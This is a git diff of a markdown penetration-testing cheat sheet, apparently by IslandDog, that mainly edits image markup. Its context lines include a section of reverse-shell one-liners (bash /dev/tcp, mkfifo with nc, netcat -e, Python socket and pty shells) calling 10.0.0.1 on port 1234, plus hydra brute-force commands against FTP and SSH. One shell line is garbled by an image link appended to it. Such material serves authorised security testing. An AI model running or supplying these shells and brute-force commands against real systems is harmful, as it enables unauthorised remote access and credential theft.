@@ -18,7 +18,8 @@ sudo nmap -sU -sV --version-intensity 0 -F -n ${PWD##*/}
 ## Reverse Shell #OneLiners
 ```bash
 bash -i >& /dev/tcp/10.0.0.1/1234 0>&1
-rm /tmp/h;mkfifo /tmp/h;cat /tmp/h|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/h
+rm /tmp/h;mkfifo /tmp/h;cat /tmp/h|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/h![id](https://user-images.githubusercontent.com/16761753/131189586-60b218ce-987a-4c47-84c5-609dbedf4d24.png)
+
 {nc.tradentional|nc|ncat|netcat} 10.0.0.1 1234 {-e|-c} /bin/bash
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);s.close()'
 python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/bash");s.close()'
@@ -479,5 +480,5 @@ hydra -V -f -L users -P passwords ftp://${PWD##*/} -u -vV
 hydra -V -f -L users -P passwords ssh://${PWD##*/} -u -vV
 ```
 
-![[id.png|20x20]] IslandDog - Christopher Soehnlein 2021
+<img src="https://user-images.githubusercontent.com/16761753/131189628-abde5896-f896-4154-bf24-ea04e099a62a.png" width="20" height="20"> IslandDog - Christopher Soehnlein 2021
 https://IslandDog.ky
